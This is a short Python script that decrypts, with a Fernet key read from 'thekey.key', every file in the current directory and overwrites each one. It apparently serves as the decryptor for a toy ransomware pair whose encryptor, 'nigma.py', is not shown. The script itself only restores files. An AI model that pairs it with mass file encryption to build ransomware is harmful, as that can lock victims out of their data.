import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir() :
	if file == "nigma.py" or file == "thekey.key" or file == "decrypt.py" :
		continue

	if os.path.isfile(file):
		files.append(file)

with open("thekey.key", "rb") as thekey :

	secretkey = thekey.read()

for file in files :

	with open(file, "rb") as thefile :
		contents = thefile.read()

	contents_decrypt = Fernet(secretkey).decrypt(contents)

	with open(file, "wb") as thefile :

		thefile.write(contents_decrypt)